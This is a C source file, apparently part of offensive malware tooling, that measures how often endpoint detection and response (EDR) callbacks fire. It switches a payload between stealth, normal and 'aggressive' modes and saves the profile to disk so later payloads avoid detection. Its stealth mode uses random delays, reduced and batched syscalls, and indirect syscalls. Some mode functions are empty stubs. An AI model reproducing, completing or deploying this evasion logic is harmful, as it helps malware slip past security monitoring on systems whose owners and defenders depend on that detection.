/*
 * EDR Throttle Profiler
 * Dynamic EDR Detection and Adaptive Payload Behavior
 *
 * Monitors EDR callback frequency and adjusts payload behavior:
 * - Frequent callbacks: Stealth mode (reduced syscalls, delayed operations)
 * - Rare callbacks: Aggressive mode (exploit aggressively)
 * - Throttled callbacks: Normal mode
 *
 * Profiles are persisted for subsequent payloads to avoid repeated detection.
 */

#include "edr_throttle_profiler.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define EDR_PROFILE_MAGIC 0x4452544F
#define EDR_PROFILE_VERSION 1
#define EDR_MAX_CALLBACKS 10000
#define EDR_SAMPLE_WINDOW_MS 5000
#define EDR_CALLBACK_THRESHOLD_MS 100

typedef struct {
    DWORD pid;
    const char* process_name;
    DWORD callback_port;
} EDR_DETECTION_DATA;

typedef struct {
    DWORD magic;
    DWORD version;
    FILETIME timestamp;
    EDR_PROFILE_TYPE profile_type;
    int callback_count;
    DWORD min_callback_interval_ms;
    DWORD max_callback_interval_ms;
    DWORD avg_callback_interval_ms;
    DWORD throttle_confidence;
} EDR_PROFILE_HEADER;

static struct {
    DWORD last_callback_time;
    DWORD callback_count;
    DWORD min_interval;
    DWORD max_interval;
    DWORD total_interval;
    int initialized;
} g_edr_profiler_state = {0};

HANDLE edr_profiler_init()
{
    EDR_PROFILE_CONTEXT* ctx = (EDR_PROFILE_CONTEXT*)malloc(sizeof(EDR_PROFILE_CONTEXT));
    if (!ctx) return NULL;

    memset(ctx, 0, sizeof(EDR_PROFILE_CONTEXT));
    ctx->magic = EDR_PROFILE_MAGIC;
    ctx->version = EDR_PROFILE_VERSION;
    ctx->initialized = 1;
    ctx->state = EDR_PROFILE_INITIALIZING;

    GetSystemTimeAsFileTime(&ctx->start_time);

    g_edr_profiler_state.initialized = 1;
    g_edr_profiler_state.callback_count = 0;
    g_edr_profiler_state.min_interval = UINT32_MAX;
    g_edr_profiler_state.max_interval = 0;
    g_edr_profiler_state.total_interval = 0;

    return (HANDLE)ctx;
}

void edr_profiler_shutdown(HANDLE profiler)
{
    if (!profiler) return;
    EDR_PROFILE_CONTEXT* ctx = (EDR_PROFILE_CONTEXT*)profiler;
    free(ctx);
}

void edr_profiler_record_callback(HANDLE profiler)
{
    if (!profiler || !g_edr_profiler_state.initialized) return;

    DWORD current_time = GetTickCount();

    if (g_edr_profiler_state.callback_count > 0) {
        DWORD interval = current_time - g_edr_profiler_state.last_callback_time;

        if (interval < g_edr_profiler_state.min_interval) {
            g_edr_profiler_state.min_interval = interval;
        }
        if (interval > g_edr_profiler_state.max_interval) {
            g_edr_profiler_state.max_interval = interval;
        }
        g_edr_profiler_state.total_interval += interval;
    }

    g_edr_profiler_state.last_callback_time = current_time;
    g_edr_profiler_state.callback_count++;

    EDR_PROFILE_CONTEXT* ctx = (EDR_PROFILE_CONTEXT*)profiler;
    if (ctx->callback_count < EDR_MAX_CALLBACKS) {
        ctx->callback_count++;
    }
}

EDR_PROFILE_TYPE edr_profiler_analyze(HANDLE profiler)
{
    if (!profiler) return EDR_PROFILE_UNKNOWN;

    EDR_PROFILE_CONTEXT* ctx = (EDR_PROFILE_CONTEXT*)profiler;
    if (ctx->callback_count == 0) {
        return EDR_PROFILE_NOT_DETECTED;
    }

    DWORD avg_interval = 0;
    if (g_edr_profiler_state.callback_count > 1) {
        avg_interval = g_edr_profiler_state.total_interval / (g_edr_profiler_state.callback_count - 1);
    }

    ctx->avg_callback_interval = avg_interval;
    ctx->min_callback_interval = g_edr_profiler_state.min_interval;
    ctx->max_callback_interval = g_edr_profiler_state.max_interval;

    if (avg_interval == 0 || ctx->callback_count == 0) {
        return EDR_PROFILE_NOT_DETECTED;
    }

    if (avg_interval < 50) {
        ctx->state = EDR_PROFILE_FREQUENT;
        ctx->throttle_confidence = 95;
        return EDR_PROFILE_FREQUENT;
    }
    else if (avg_interval < EDR_CALLBACK_THRESHOLD_MS) {
        ctx->state = EDR_PROFILE_NORMAL;
        ctx->throttle_confidence = 70;
        return EDR_PROFILE_NORMAL;
    }
    else if (avg_interval < 500) {
        ctx->state = EDR_PROFILE_THROTTLED;
        ctx->throttle_confidence = 50;
        return EDR_PROFILE_THROTTLED;
    }
    else {
        ctx->state = EDR_PROFILE_RARE;
        ctx->throttle_confidence = 30;
        return EDR_PROFILE_RARE;
    }
}

int edr_profiler_get_adaptive_mode(HANDLE profiler, EDR_ADAPTIVE_MODE* out_mode)
{
    if (!profiler || !out_mode) return -1;

    EDR_PROFILE_CONTEXT* ctx = (EDR_PROFILE_CONTEXT*)profiler;
    EDR_PROFILE_TYPE profile = ctx->state;

    if (profile == EDR_PROFILE_NOT_DETECTED) {
        *out_mode = EDR_MODE_NORMAL;
        return 0;
    }

    switch (profile) {
        case EDR_PROFILE_FREQUENT:
            *out_mode = EDR_MODE_STEALTH;
            return 0;
        case EDR_PROFILE_NORMAL:
            *out_mode = EDR_MODE_NORMAL;
            return 0;
        case EDR_PROFILE_THROTTLED:
            *out_mode = EDR_MODE_NORMAL;
            return 0;
        case EDR_PROFILE_RARE:
            *out_mode = EDR_MODE_AGGRESSIVE;
            return 0;
        default:
            *out_mode = EDR_MODE_NORMAL;
            return -1;
    }
}

int edr_profiler_save_profile(HANDLE profiler, const char* profile_path)
{
    if (!profiler || !profile_path) return -1;

    EDR_PROFILE_CONTEXT* ctx = (EDR_PROFILE_CONTEXT*)profiler;

    FILE* f = fopen(profile_path, "wb");
    if (!f) return -1;

    EDR_PROFILE_HEADER header = {0};
    header.magic = EDR_PROFILE_MAGIC;
    header.version = EDR_PROFILE_VERSION;
    GetSystemTimeAsFileTime(&header.timestamp);
    header.profile_type = ctx->state;
    header.callback_count = ctx->callback_count;
    header.min_callback_interval_ms = ctx->min_callback_interval;
    header.max_callback_interval_ms = ctx->max_callback_interval;
    header.avg_callback_interval_ms = ctx->avg_callback_interval;
    header.throttle_confidence = ctx->throttle_confidence;

    size_t written = fwrite(&header, sizeof(header), 1, f);
    fclose(f);

    return (written == 1) ? 0 : -1;
}

int edr_profiler_load_profile(const char* profile_path, EDR_PROFILE_CONTEXT* out_profile)
{
    if (!profile_path || !out_profile) return -1;

    FILE* f = fopen(profile_path, "rb");
    if (!f) return -1;

    EDR_PROFILE_HEADER header = {0};
    size_t read = fread(&header, sizeof(header), 1, f);
    fclose(f);

    if (read != 1 || header.magic != EDR_PROFILE_MAGIC) {
        return -1;
    }

    out_profile->state = header.profile_type;
    out_profile->callback_count = header.callback_count;
    out_profile->min_callback_interval = header.min_callback_interval_ms;
    out_profile->max_callback_interval = header.max_callback_interval_ms;
    out_profile->avg_callback_interval = header.avg_callback_interval_ms;
    out_profile->throttle_confidence = header.throttle_confidence;
    out_profile->magic = EDR_PROFILE_MAGIC;
    out_profile->version = EDR_PROFILE_VERSION;
    out_profile->initialized = 1;

    return 0;
}

int edr_profiler_apply_stealth_mode()
{
    DWORD delay = 500 + (rand() % 500);
    Sleep(delay);

    return 0;
}

int edr_profiler_apply_normal_mode()
{
    return 0;
}

int edr_profiler_apply_aggressive_mode()
{
    return 0;
}

int edr_profiler_adjust_behavior(EDR_ADAPTIVE_MODE mode)
{
    switch (mode) {
        case EDR_MODE_STEALTH:
            return edr_profiler_apply_stealth_mode();
        case EDR_MODE_NORMAL:
            return edr_profiler_apply_normal_mode();
        case EDR_MODE_AGGRESSIVE:
            return edr_profiler_apply_aggressive_mode();
        default:
            return -1;
    }
}

int edr_profiler_get_syscall_delay(EDR_ADAPTIVE_MODE mode)
{
    switch (mode) {
        case EDR_MODE_STEALTH:
            return 100 + (rand() % 400);
        case EDR_MODE_NORMAL:
            return 10 + (rand() % 50);
        case EDR_MODE_AGGRESSIVE:
            return 0;
        default:
            return 50;
    }
}

int edr_profiler_should_reduce_syscalls(EDR_ADAPTIVE_MODE mode)
{
    return (mode == EDR_MODE_STEALTH) ? 1 : 0;
}

int edr_profiler_should_batch_operations(EDR_ADAPTIVE_MODE mode)
{
    return (mode == EDR_MODE_STEALTH) ? 1 : 0;
}

int edr_profiler_should_use_indirect_syscalls(EDR_ADAPTIVE_MODE mode)
{
    return (mode == EDR_MODE_STEALTH || mode == EDR_MODE_NORMAL) ? 1 : 0;
}
